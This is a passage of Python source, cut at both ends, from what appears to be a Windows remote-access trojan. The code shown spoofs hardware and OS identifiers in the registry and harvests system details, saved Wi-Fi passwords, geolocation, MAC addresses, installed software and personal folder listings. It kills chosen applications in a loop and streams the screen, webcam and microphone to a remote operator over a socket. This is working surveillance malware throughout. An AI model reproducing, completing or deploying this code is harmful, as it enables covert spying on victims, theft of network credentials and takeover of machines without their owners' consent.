                        loger(text=f'Recovered BIOS_VERSION --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'BIOS_DATE': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\BIOS', 
                            'BIOSReleaseDate', 
                            ' '.join(_device[1][0]), 
                            mode=0
                        )
                        loger(text=f'Recovered BIOS_DATE --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'CPU_CAPTION': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                            'Identifier', 
                            ' '.join(_device[1][0]), 
                            mode=1
                        )
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\FloatingPointProcessor', 
                            'Identifier', 
                            ' '.join(_device[1][0]), 
                            mode=1
                        )
                        loger(text=f'Recovered CPU_CAPTION --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'CPU_NAME': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                            'ProcessorNameString', 
                            ' '.join(_device[1][0]), 
                            mode=1
                        ) 
                        loger(text=f'Recovered CPU_NAME --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'CPU_MANUFACTURER': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                            'VendorIdentifier', 
                            ' '.join(_device[1][0]), 
                            mode=1
                        )
                        loger(text=f'Recovered CPU_MANUFACTURER --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'VIDEOCARD': 
                        for device_name in _device[1]: 
                            reg_device(
                                rf'{PATH}\devices\__VIDEOCARD__.bin', 
                                'FriendlyName', 
                                ' '.join(device_name), 
                                variable=['VIDEO_CARD_NAME', 'VIDEO_CARD_PATH'], 
                                mode=4
                            )
                            loger(text=f'Recovered VIDEOCARD --> {" ".join(device_name)}', mode=1)
                    elif _device[0] == 'DISK': 
                        for device_name in _device[1]: 
                            reg_device(
                                rf'{PATH}\devices\__DISK__.bin', 
                                'FriendlyName', 
                                ' '.join(device_name), 
                                variable=['DISK_NAME', 'DISK_PATH'], 
                                mode=4
                            )
                            loger(text=f'Recovered DISK --> {" ".join(device_name)}', mode=1)
                    elif _device[0] == 'MONITOR': 
                        for device_name in _device[1]: 
                            reg_device(
                                rf'{PATH}\devices\__MONITOR__.bin', 
                                'DeviceDesc', 
                                ' '.join(device_name), 
                                variable=['MONITOR_NAME', 'MONITOR_PATH'], 
                                mode=4
                            )
                            loger(text=f'Recovered MONITOR --> {" ".join(device_name)}', mode=1)
                    elif _device[0] == 'SOUNDDEVICE': 
                        for device_name in _device[1]: 
                            reg_device(
                                rf'{PATH}\devices\__SOUNDDEVICE__.bin', 'DeviceDesc', 
                                ' '.join(device_name), 
                                variable=['SOUND_DEVICE_NAME', 'SOUND_DEVICE_PATH'], 
                                mode=4
                            )
                            loger(text=f'Recovered SOUNDDEVICE --> {" ".join(device_name)}', mode=1)
                    elif _device[0] == 'ADAPTER': 
                        for device_name in _device[1]: 
                            reg_device(
                                rf'{PATH}\devices\__ADAPTER__.bin', 
                                'FriendlyName', 
                                ' '.join(device_name), 
                                variable=['ADAPTER_NAME', 'ADAPTER_PATH'], 
                                mode=4
                            )
                            loger(text=f'Recovered ADAPTER --> {" ".join(device_name)}', mode=1)
                except: 
                    continue 
        case 2:
            if computer_name: 
                reg_device(
                    r'SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName', 
                    'ComputerName', 
                    computer_name, 
                    mode=0
                ) 
                reg_device(
                    r'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName', 
                    'ComputerName', 
                    computer_name, 
                    mode=0
                )
                loger(text=f'Changed NODE --> {computer_name}', mode=1)
            if computer_platform: 
                reg_device(
                    r'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 
                    'ProductName', 
                    computer_platform, 
                    mode=0
                )
                loger(text=f'Changed PLATFORM --> {computer_platform}', mode=1)
            if computer_version: 
                reg_device(
                    r'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 
                    'CurrentBuild', 
                    computer_version, 
                    mode=0
                )
                reg_device(
                    r'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 
                    'CurrentBuildNumber', 
                    computer_version, 
                    mode=0
                )
                loger(text=f'Changed PLATFORM_VERSION --> {computer_version}', mode=1)
            if computer_edition: 
                reg_device(
                    r'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 
                    'EditionID', 
                    computer_edition, 
                    mode=0
                )
                loger(text=f'Changed PLATFORM_EDITION --> {computer_edition}', mode=1)
            if computer_product_code: 
                reg_device(
                    r'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 
                    'ProductId', 
                    computer_product_code, 
                    mode=0
                )
                loger(text=f'Changed PRODUCT_CODE --> {computer_product_code}', mode=1)
            if motherboard_name: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\BIOS', 
                    'BaseBoardManufacturer',
                    motherboard_name, 
                    mode=0
                )
                loger(text=f'Changed MOTHERBOARD_MANUFACTURER --> {motherboard_name}', mode=1)
            if motherboard_product: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\BIOS', 
                    'BaseBoardProduct', 
                    motherboard_product, 
                    mode=0
                )
                loger(text=f'Changed MOTHERBOARD --> {motherboard_product}', mode=1)
            if bios_name: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\BIOS', 
                    'BIOSVendor', 
                    bios_name, 
                    mode=0
                )
                loger(text=f'Changed BIOS_NAME --> {bios_name}', mode=1)
            if bios_version: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\BIOS', 
                    'BIOSVersion', 
                    bios_version, 
                    mode=0
                )
                loger(text=f'Changed BIOS_VERSION --> {bios_version}', mode=1)
            if bios_date: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\BIOS', 
                    'BIOSReleaseDate', 
                    bios_date, 
                    mode=0
                )
                loger(text=f'Changed BIOS_DATE --> {bios_date}', mode=1)
            if cpu: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                    'Identifier', 
                    cpu, 
                    mode=1
                )
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\FloatingPointProcessor', 
                    'Identifier', 
                    cpu, 
                    mode=1
                )
                loger(text=f'Changed CPU --> {cpu}', mode=1)
            if cpu_name: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                    'ProcessorNameString', 
                    cpu_name, 
                    mode=1
                )
                loger(text=f'Changed CPU_NAME --> {cpu_name}', mode=1)
            if cpu_id: 
                reg_device(
                    r'HARDWARE\DESCRIPTION\System\CentralProcessor', 
                    'VendorIdentifier', 
                    cpu_id, 
                    mode=1
                )
                loger(text=f'Changed CPU_ID --> {cpu_id}', mode=1)
            if video_card: 
                reg_device(
                    reg_path=rf'{PATH}\devices\__VIDEOCARD__.bin', 
                    value='FriendlyName', 
                    content=video_card, 
                    variable='VIDEO_CARD_PATH', 
                    mode=2
                )
                loger(text=f'Changed VIDEOCARD --> {video_card}', mode=1)
            if disk: 
                reg_device(
                    reg_path=rf'{PATH}\devices\__DISK__.bin', 
                    value='FriendlyName', 
                    content=disk, 
                    variable='DISK_PATH', 
                    mode=2
                )
                loger(text=f'Changed DISK --> {disk}', mode=1)
            if monitor: 
                reg_device(
                    reg_path=rf'{PATH}\devices\__MONITOR__.bin', 
                    value='DeviceDesc', 
                    content=monitor, 
                    variable='MONITOR_PATH', 
                    mode=2
                )
                loger(text=f'Changed MONITOR --> {monitor}', mode=1)
            if sound_device: 
                reg_device(
                    reg_path=rf'{PATH}\devices\__SOUNDDEVICE__.bin', 
                    value='DeviceDesc', 
                    content=sound_device, 
                    variable='SOUND_DEVICE_PATH', 
                    mode=2
                )
                loger(text=f'Changed SOUNDDEVICE --> {sound_device}', mode=1)
            if network_adapter: 
                reg_device(
                    reg_path=rf'{PATH}\devices\__ADAPTER__.bin',
                    value='FriendlyName', 
                    content=network_adapter, 
                    variable='ADAPTER_PATH', 
                    mode=2
                )
                loger(text=f'Changed ADAPTER --> {network_adapter}', mode=1)
        case 3: 
            try:
                with open(rf'{PATH}\devices\__LOG__.bin', 'r', encoding='utf-8') as log_bin: 
                    log_bin_data = log_bin.read()

                if log_bin_data: 
                    send_msg(session, log_bin_data)  
                else: 
                    send_msg(session, 'Devices log is empty')
            except BaseException as error: 
                send_msg(session, f'Why: An error occurred in device\nType: {type(error).__name__}\nDescription: {error}')            
        case _:
            match device_id:
                case 'DISK':
                    device_path = rf'{PATH}\devices\__DISK__.bin'
                    device_variable = 'DISK_PATH'
                case 'VIDEOCARD': 
                    device_path = rf'{PATH}\devices\__VIDEOCARD__.bin'
                    device_variable = 'VIDEO_CARD_PATH'
                case 'MONITOR': 
                    device_path = rf'{PATH}\devices\__MONITOR__.bin' 
                    device_variable = 'MONITOR_PATH ' 
                case 'SOUNDDEVICE': 
                    device_path = rf'{PATH}\devices\__SOUNDDEVICE__.bin'
                    device_variable = 'SOUND_DEVICE_PATH'
                case _: 
                    device_path = rf'{PATH}\devices\__USB__.bin'
                    device_variable = usb

            with open(device_path, 'r') as disk_status:
                for _device_path in disk_status.read().split('\n'): 
                    try:
                        if (device_path := _device_path.split())[0] == usb:
                            match usb:
                                case (
                                    'MOUSE_ENABLE' | 'MOUSE_DISABLE' 
                                    | 'KEYBOARD_ENABLE' | 'KEYBOARD_DISABLE' 
                                    | 'ETHERNET_ENABLE' | 'ETHERNET_DISABLE' 
                                    | 'WLAN_ENABLE' | 'WLAN_DISABLE' 
                                    | 'BLUETOOTH_ENABLE' | 'BLUETOOTH_DISABLE' 
                                    | 'PRINTER_ENABLE' | 'PRINTER_DISABLE'
                                ):
                                    try: 
                                        run(device_path[2:], stdout=DEVNULL, stderr=DEVNULL, shell=True)
                                    except BaseException as error: 
                                        loger(error=error)
                                    else: 
                                        loger(device_status, device_path[0], device_path[-1])
                                    return
                                case _:
                                        for reg_data in [
                                            (device_path[-1], None, None, None, 0), 
                                            (device_path[-1], 'AllowCamera', 0 if device_status != 'enable' else 1, 0, 1)
                                        ]:
                                            try: 
                                                regedit(*reg_data)
                                            except BaseException as error: 
                                                loger(error=error)

                                                continue
                                            else: 
                                                loger(device_status, device_path[0], device_path[-1])
                                        return
                        else: 
                            if (device_path := _device_path.split())[0] == device_variable: 
                                try: 
                                    regedit(device_path[-1], 'ConfigFlags', 0 if device_status == 'enable' else 1, 0, 1)
                                except BaseException as error: 
                                    loger(error=error)
                                else: 
                                    loger(device_status, device_path[0], device_path[-1])
                                continue
                    except: 
                        continue


def systeminfo(ipconfig=False): 
    disk = []
    route_ssid = []
    route_password = []
    interface_status = []

    if not ipconfig:
        try: 
            _node = node()
        except:
            _node = 'NOT FOUND'
        
        try: 
            _platform = system()
        except: 
            _platform = 'NOT FOUND'
        
        try: 
            _release = release()
        except: 
            _release = 'NOT FOUND'
        
        try: 
            _edition = win32_edition()
        except: 
            _edition = 'NOT FOUND'
        
        try: 
            _version = version()
        except: 
            _version = 'NOT FOUND'
        
        try: 
            bios_manufacturer = run('wmic BIOS get manufacturer'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split('\n')[1].strip()
        except: 
            bios_manufacturer = 'NOT FOUND'
        
        try: 
            bios_version = run('wmic BIOS get SMBIOSBIOSVersion'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split()[-1]
        except: 
            bios_version = 'NOT FOUND'
        
        try: 
            bios_date = search(r'(\d+/\d+/\d+|\d+[.]\d+[.]\d+)', run('wmic BIOS get BIOSVersion'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866')).group(1)
        except: 
            bios_date = 'NOT FOUND'
        
        try: 
            bios_time = search(r'(\d+[:]\d+[:]\d+)', run('wmic BIOS get BIOSVersion'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866')).group(1)
        except: 
            bios_time = 'NOT FOUND'
        
        try: 
            product_code = run('wmic OS get SerialNumber'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split()[-1]
        except: 
            product_code = 'NOT FOUND'
        
        try: 
            language = windows_locale[windll.kernel32.GetUserDefaultUILanguage()].replace('_', '-')
        except: 
            language = 'NOT FOUND'
        try: 
            motherboard = run('wmic BASEBOARD get product'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split()[-1]
        except: 
            motherboard = 'NOT FOUND'
        
        try: 
            _architecture = f"x{''.join([char for char in architecture()[0] if char.isdigit()])}"
        except: 
            try: 
                _architecture = architecture()
            except: 
                _architecture = 'NOT FOUND'
        
        try: 
            screen_resolution = f'{(resolution := pygui.size()).width}x{resolution.height}'
        except: 
            screen_resolution = 'NOT FOUND'
        
        try: 
            _core = str(cpu_count())
        except:
            _core = 'NOT FOUND'
        
        try: 
            _processor = processor()
        except: 
            _processor = 'NOT FOUND'
        
        try: 
            cpu_frequency = run('wmic CPU get Maxclockspeed'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split()[-1]
        except: 
            cpu_frequency = 'NOT FOUND'
        
        try: 
            video_card = run('wmic PATH win32_videocontroller get VideoProcessor'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split('\n')[1].strip()
        except: 
            video_card = 'NOT FOUND'
        
        try: 
            ram = list(zip([_socket.strip() for _socket in run(
                    'wmic MEMORYCHIP get DeviceLocator'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
                ).stdout.decode('cp866').split('\n') if _socket.strip()][1:], 
                [f'{int(_capacity.strip()) // 1024 // 1024} MB' for _capacity in run(
                    'wmic memorychip get Capacity'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
                ).stdout.decode('cp866').split('\n') if _capacity.strip().isdigit()], 
                [f'{_frequency.strip()} Mhz' for _frequency in run(
                    'wmic memorychip get Speed'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
                ).stdout.decode('cp866').split('\n') if _frequency.strip()][1:])
            )
        except: 
            ram = 'NOT FOUND'
        
        for _disk in run('wmic LOGICALDISK get deviceid,size,freespace,volumename'.split(), 
            stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'
        ).split('\n'):
            try: 
                disk.append(f'Disk: {(_disk := _disk.split())[0][:-1]} | Memory: {int(_disk[2]) // 1024 // 1024 //
                                                                                  1024} GB | Name: {"".join(_disk[3:])}')
            except: 
                continue
        
        try: 
            sound_device = list(set([_sound_device.strip() for _sound_device in run('wmic SOUNDDEV get Caption'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'
            ).split('\n') if _sound_device.strip()][1:]))
        except: 
            sound_device = 'NOT FOUND'

        try: 
            printer = list(set([_printer.strip() for _printer in run('wmic PRINTERCONFIG get Description'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'
            ).split('\n')[1:] if _printer.strip()]))
        except: 
            printer = 'NOT FOUND'
        
        try: 
            user = _user if (_user := [_.strip() for _ in run(
                    'wmic USERACCOUNT get Name'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
                ).stdout.decode('cp866').split('\n')[1:
            ] if _.strip()]) else 'NOT FOUND'
        except: 
            user = 'NOT FOUND' 
        
    try:
        for wifi in get_wifi_password(): 
            route_ssid.append(wifi[0])
            route_password.append(wifi[1])

        if not route_ssid: 
            route_ssid = 'Wired LAN' 
            route_password = 'NOT FOUND'
    except: 
        route_password = 'NOT FOUND'
        route_ssid = 'NOT FOUND'
    
    try:
        website_content = parse_json(get_http(URL_IPCONFIG))
    except: 
        website_content = dict() 

    global_ip_address = website_content.get(URL_IPCONFIG_KEYS['ip'], 'NOT FOUND')

    internet_provider = website_content.get(URL_IPCONFIG_KEYS['isp'], 'NOT FOUND')

    if not URL_IPCONFIG_KEYS['coordinate']:
        try:
            coordinate = str(website_content[URL_IPCONFIG_KEYS['latitude']]) + ',' + str(website_content[URL_IPCONFIG_KEYS['longitude']])
        except: 
            coordinate = 'NOT FOUND'
    else:
        coordinate = website_content.get(URL_IPCONFIG_KEYS['coordinate'], 'NOT FOUND')

    location = {
        'country': website_content.get(URL_IPCONFIG_KEYS['country'], 'NOT FOUND'),
        'region': website_content.get(URL_IPCONFIG_KEYS['region'], 'NOT FOUND'),
        'city': website_content.get(URL_IPCONFIG_KEYS['city'], 'NOT FOUND'),  
        'location': coordinate
    }

    try: 
        ip_route = findall(r'(\d+[.]\d+[.]\d+[.]\d+)', (_ip := run(
            'ipconfig', stdout=PIPE, stderr=DEVNULL, shell=True
        ).stdout.decode('cp866')))[2::3]
    except: 
        ip_route = 'NOT FOUND'
    
    try: 
        ipv4 = findall(r'(\d+[.]\d+[.]\d+[.]\d+)', _ip)[::3]
    except: 
        ipv4 = 'NOT FOUND'
    
    try: 
        ipv6 = findall(r'(\S+[:][:]\S+[:]\S+[:]\w+)', _ip)
    except: 
        ipv6 = 'NOT FOUND'
    
    try: 
        route_mac_address = [_route_mac.upper() for _route_mac in findall(
            r'BSSID.+\s+(\S+[:]\S+[:]\S+[:]\S+[:]\S+[:]\S+)', 
            run('netsh wlan show interfaces'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'))
        ]
        
        if not route_mac_address: 
            route_mac_address = 'NOT FOUND'
    except: 
        route_mac_address = 'NOT FOUND'
    
    try: 
        computer_mac_address = [_mac.replace('-', ':') for _mac in findall(
            r'(\S+[-]\S+[-]\S+[-]\S+[-]\S+[-]\S+)', 
            run('getmac', stdout=PIPE,stderr=DEVNULL, shell=True).stdout.decode('cp866'))
        ]
    except: 
        computer_mac_address = 'NOT FOUND'
    
    try:
        if (_interface := [interface.strip() for interface in findall(
            r'(\S.+)', 
            run('wmic NIC get NetConnectionID'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'))][1:]
        ):
            for status in run(
                'wmic NIC get NetEnabled'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
            ).stdout.decode('cp866').split()[1:]: 
                if status == 'TRUE':
                    interface_status.append('Working')
                else: 
                    interface_status.append('Not working')

            interface = list(zip(_interface, interface_status))
        else: 
            interface = 'NOT FOUND'
    except: 
        interface = 'NOT FOUND'

    try: 
        adapter = list(set(
            [_adapter.strip() for _adapter in run(
                'wmic NICCONFIG get Description'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
            ).stdout.decode('cp866').split('\n')[1:] if _adapter.strip()]
        ))
    except: 
        adapter = 'NOT FOUND'
    
    if not ipconfig:
        computer = {
            'node': _node if _node else 'NOT FOUND', 
            'user': user if user else 'NOT FOUND', 
            'bios': {
                'manufacturer': bios_manufacturer if bios_manufacturer else 'NOT FOUND', 
                'version': bios_version if bios_version else 'NOT FOUND', 
                'date': bios_date if bios_date else 'NOT FOUND', 
                'time': bios_time if bios_time else 'NOT FOUND'
            }, 
            'os': {
                'platform': _platform if _platform else 'NOT FOUND', 
                'release': _release if _release else 'NOT FOUND', 
                'edition': _edition if _edition else 'NOT FOUND', 
                'version': _version if _version else 'NOT FOUND', 
                'key': product_code if product_code else 'NOT FOUND', 
                'language': language if language else 'NOT FOUND', 
                'motherboard': motherboard if motherboard else 'NOT FOUND', 
                'architecture': _architecture if _architecture else 'NOT FOUND', 
                'screen_resolution': screen_resolution if screen_resolution else 'NOT FOUND', 
                'processor': {
                    'core': _core if _core else 'NOT FOUND', 
                    'name': _processor if _processor else 'NOT FOUND', 
                    'frequency': cpu_frequency if cpu_frequency else 'NOT FOUND'
                }, 
                'video_card': video_card if video_card else 'NOT FOUND', 
                'ram': ram if ram else 'NOT FOUND', 
                'disk': disk if disk else 'NOT FOUND', 
                'sound_device': sound_device if sound_device else 'NOT FOUND',
                'printer': printer if printer else 'NOT FOUND'
            }, 
            'network': {
                'ssid': route_ssid if route_ssid else 'NOT FOUND', 
                'password': route_password if route_password else 'NOT FOUND', 
                'provider': internet_provider if internet_provider else 'NOT FOUND', 
                'ip': {
                    'global_ip_address': global_ip_address if global_ip_address else 'NOT FOUND', 
                    'route_ip_address': ip_route if ip_route else 'NOT FOUND', 
                    'computer_ipv4_address': ipv4 if ipv4 else 'NOT FOUND', 
                    'computer_ipv6_address': ipv6 if ipv6 else 'NOT FOUND'
                }, 
                'mac': {
                    'route_mac_address': route_mac_address if route_mac_address else 'NOT FOUND', 
                    'computer_mac_address': computer_mac_address if computer_mac_address else 'NOT FOUND'
                }, 
                'interface': interface if interface else 'NOT FOUND', 
                'adapter': adapter if adapter else 'NOT FOUND'
            }, 
            'located': {
                'country': location['country'], 
                'region': location['region'],
                'city': location['city'], 
                'location': location['location']
            }
        }

        return \
            f'Node: {computer["node"
            ]}\nUser: {computer["user"
            ]}\nBIOS manufacturer: {computer["bios"]["manufacturer"]} | Version: {computer["bios"]["version"
            ]}\nBIOS created: {computer["bios"]["time"]} | {computer["bios"]["date"
            ]}\nPlatform: {computer["os"]["platform"]} {computer["os"]["release"]} {computer["os"]["edition"]} | Version: {computer["os"]["version"
            ]}\nProduct code: {computer["os"]["key"
            ]}\nLanguage: {computer["os"]["language"
            ]}\nMotherboard: {computer["os"]["motherboard"
            ]}\nArchitecture: {computer["os"]["architecture"
            ]}\nScreen resolution: {computer["os"]["screen_resolution"
            ]}\nProcessor core: {computer["os"]["processor"]["core"]} | Name: {computer["os"]["processor"]["name"]}, | Mhz: {computer["os"]["processor"]["frequency"
            ]}\nVideo card: {computer["os"]["video_card"
            ]}\nRAM: {computer["os"]["ram"
            ]}\nDisk: {computer["os"]["disk"
            ]}\nSound device: {computer["os"]["sound_device"
            ]}\nPrinter: {computer["os"]["printer"
            ]}\nRouter ssid: {computer["network"]["ssid"
            ]}\nIP-Address router: {computer["network"]["ip"]["route_ip_address"
            ]}\nRouter Mac-Address: {computer["network"]["mac"]["route_mac_address"
            ]}\nRouter password: {computer["network"]["password"
            ]}\nGlobal IP-Address: {computer["network"]["ip"]["global_ip_address"
            ]}\nInternet provider: {computer["network"]["provider"
            ]}\nIPv4-Address: {computer["network"]["ip"]["computer_ipv4_address"
            ]}\nIPv6-Address: {computer["network"]["ip"]["computer_ipv6_address"
            ]}\nMac-Address: {computer["network"]["mac"]["computer_mac_address"
            ]}\nInterface: {computer["network"]["interface"
            ]}\nAdapter: {computer["network"]["adapter"
            ]}\nCountry: {computer["located"]["country"
            ]}\nRegion: {computer["located"]["region"
            ]}\nCity: {computer["located"]["city"
            ]}\nLocation: {computer["located"]["location"]}'
    else:
        return \
            f'Router ssid: {route_ssid if route_ssid else "NOT FOUND"}\n' + \
            f'Router IP-Address: {ip_route if ip_route else "NOT FOUND"}\n' + \
            f'Router Mac-Address: {route_mac_address if route_mac_address else "NOT FOUND"}\n' + \
            f'Router password: {route_password if route_password else "NOT FOUND"}\n' + \
            f'Global IP-Address: {global_ip_address}\n' + \
            f'Internet provider: {internet_provider}\n' + \
            f'IPv4-Address: {ipv4 if ipv4 else "NOT FOUND"}\n' + \
            f'IPv6-Address: {ipv6 if ipv6 else "NOT FOUND"}\n' + \
            f'Mac-Address: {computer_mac_address if computer_mac_address else "NOT FOUND"}\n' + \
            f'Interface: {interface if interface else "NOT FOUND"}\n' + \
            f'Adapter: {adapter if adapter else "NOT FOUND"}\n' + \
            f'Country: {location["country"]}\n' + \
            f'Region: {location["region"]}\n' + \
            f'City: {location["city"]}\n' + \
            f'Location: {location["location"]}'
                

def get_services():
    service_names = []
    service_descriptions = [] 
    service_counter = 1

    for service in findall(
        r'^\S+\s(\S?.+)\r', 
        all_services := cmd(run('sc query state= all'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout), 
        flags=MULTILINE
    ):
        if not service_counter % 2 == 0:
            service_names.append(service) 
        else:
            service_descriptions.append(service)
        
        service_counter += 1

    return list(zip(
        service_names, 
        service_descriptions, 
        findall(r'(RUNNING|STOPPED)', all_services)
    ))


def get_paths():
    

    def go_to_directory(name_directory, path_directory, mode=0):
        nonlocal paths

        paths += f'/{"-":-^50}<{name_directory}>{"-":-^50}\\\n'

        if mode == 0:
            for path_of_directory in glob(f'{path_directory}\\*'): 
                paths += f' {path_of_directory}\n'
        else: 
            for _process in run(path_directory.split(), stdout=PIPE, stderr=DEVNULL, shell=True
            ).stdout.decode('cp866').split('\n')[1:]:
                if process := _process[_process.find('"') + 1:_process.rfind('"')]:
                    paths += f' {process.strip()}\n'


    paths = ''

    if disk_directory := [disk_id + '\\' for disk_id in (run('wmic LOGICALDISK get deviceid'.split(), 
        stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split()[1:])
    ]:
        for path_to_disk in disk_directory: 
            go_to_directory(path_to_disk, path_to_disk.split('\\')[0])

    for directories in [
        ('OneDrive', rf'C:\Users\{getlogin()}\OneDrive'), 
        ('Favorites', rf'C:\Users\{getlogin()}\Favorites'), 
        ('Desktop', rf'C:\Users\{getlogin()}\Desktop'), 
        ('Downloads', rf'C:\Users\{getlogin()}\Downloads'), 
        ('Documents', rf'C:\Users\{getlogin()}\Documents'), 
        ('Pictures', rf'C:\Users\{getlogin()}\Pictures'), 
        ('Videos', rf'C:\Users\{getlogin()}\Videos'), 
        ('Music', rf'C:\Users\{getlogin()}\Music'), 
        ('Contacts', rf'C:\Users\{getlogin()}\Contacts'), 
        ('Program Files', r'C:\Program Files'), 
        ('Program Files (x86)', r'C:\Program Files (x86)'), 
        ('Users', r'C:\Users'), 
        ('Windows', r'C:\Windows'), 
        ('Startup', 'wmic STARTUP get Command')
    ]: 
        go_to_directory(directories[0], directories[-1], mode=0 if directories[0] != 'Startup' else 1)
    
    return paths


def block_app(mode=1):
    while True:
        try:
            with open(rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0': 
                    return
        except: ...

        try:
            if not exists(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2'):
                with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'w', encoding='utf-8') as app_requirement: ...
            
            with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'r', encoding='utf-8') as app_requirement:
                for app in app_requirement.read().split('\n'):
                    try:
                        if (app := app.split())[-2] == '-->': 
                            run(f'taskkill /f /IM {app[-1]}', stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    except: 
                        continue
        except: ...

        try:
            if mode == 1: 
                module_report(rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919')
        except: ...

        try: 
            sleep(3)
        except: ...


def apps():
    _apps = ''

    if (app := [_app.strip() for _app in (cmd(run('wmic PRODUCT get name'.split(), 
        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')) if _app.strip()][1:]
    ):
        for _application in app:
            _apps += f'{_application}\n'
    else: 
        _apps += 'NOT FOUND'

    return _apps


def record_sound(audio, stream): 
    frames = []

    for _ in range(44100 // 1024 * 3): 
        frames.append(stream.read(1024, exception_on_overflow=False))

    with open_audio(rf'{PATH}\file\881V1-38B8-9B39-94AA-4B09-E2E5-1746-4A89.mp3', 'wb') as sound_mp3: 
        sound_mp3.setnchannels(1)
        sound_mp3.setsampwidth(audio.get_sample_size(paInt16))
        sound_mp3.setframerate(44100)
        sound_mp3.writeframesraw(b''.join(frames))
   
    with open(rf'{PATH}\file\881V1-38B8-9B39-94AA-4B09-E2E5-1746-4A89.mp3', 'rb') as sound_mp3:
        return sound_mp3.read()


def share(session, mode):


    def close_audio():
        stream.stop_stream()
        stream.close()
        audio.terminate()


    if mode == 2:
        audio = PyAudio()
        stream = audio.open(format=paInt16, channels=1, rate=44100, 
                            input=True, frames_per_buffer=1024)

    while True:
        try:
            try:
                if mode == 2: 
                    session.sendall( record_sound(audio, stream))
                else: 
                    if mode == 0 :
                        session.sendall(screenshot())
                    else: 
                        session.sendall(screenshot_webcam())
            except: 
                send_msg(session, 'share error')   

            if receive_msg(session) == 'ctrl_c': 
                if mode == 2: 
                    close_audio()

                clean_folder_file(mode)
                return
        except ConnectionError:
            if mode == 2: 
                close_audio()

            clean_folder_file(mode)
            return
        except: 
            continue


def screenshot():
    try: 
        pygui.screenshot(rf'{PATH}\file\1B8C-069C-0529-4633-8FDC-2FE9-2D30-CE5B.png')
    except: 
        try:
            for path_screenshots in (screenshot_directories := [
                rf'C:\Users\{getlogin()}\OneDrive\Pictures\Screenshots', 
                rf'C:\Users\{getlogin()}\OneDrive\Изображения\Снимки экрана', 
                rf'C:\Users\{getlogin()}\OneDrive\Зображення\Снимки экрана', 
                rf'C:\Users\{getlogin()}\Pictures\Screenshots'
            ]):
                try: 
                    delete_directory(path_screenshots)
                except: 
                    continue

            pygui.hotkey('win', 'printscreen')
            sleep(1)

            for screenshot_directory in screenshot_directories:
                for screenshot_file in glob(f'{screenshot_directory}\\*'):
                    try:
                        if screenshot_file.split('.')[-1] == 'png':
                            move_path(screenshot_file, rf'{PATH}\file\1B8C-069C-0529-4633-8FDC-2FE9-2D30-CE5B.png')
                            
                            try: 
                                delete_directory(screenshot_directory)
                            except: ...

                            with open(rf'{PATH}\file\1B8C-069C-0529-4633-8FDC-2FE9-2D30-CE5B.png', 'rb') as screenshot_png: 
                                return screenshot_png.read()
                    except: 
                        continue
        except: 
            return
    else:
        with open(rf'{PATH}\file\1B8C-069C-0529-4633-8FDC-2FE9-2D30-CE5B.png', 'rb') as screenshot_png: 
            return screenshot_png.read()
        

def screenshot_webcam():
    try:
        webcam = VideoCapture(0)

        if not webcam.isOpened(): 
            webcam = VideoCapture(1)

        if webcam.isOpened(): 
